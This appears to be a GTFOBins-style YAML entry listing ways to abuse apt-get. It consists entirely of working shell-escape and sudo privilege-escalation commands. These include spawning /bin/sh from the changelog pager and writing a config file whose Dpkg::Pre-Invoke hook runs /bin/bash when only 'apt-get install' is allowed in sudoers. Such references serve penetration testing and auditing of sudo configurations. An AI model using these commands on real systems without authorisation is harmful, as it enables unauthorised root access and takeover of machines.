---
functions:
  shell:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        apt-get changelog apt
        !/bin/sh
  sudo:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo apt-get changelog apt
        !/bin/sh
    - description: 'Sometimes, only some subcommands of `apt-get` are enabled by sysadmin in the sudoers file. When only `apt-get install *` is allowed, you can use:'
      code: |
        echo 'Dpkg::Pre-Invoke {"/bin/bash";};' > test.conf
        sudo apt-get install -c ./test.conf sl
---
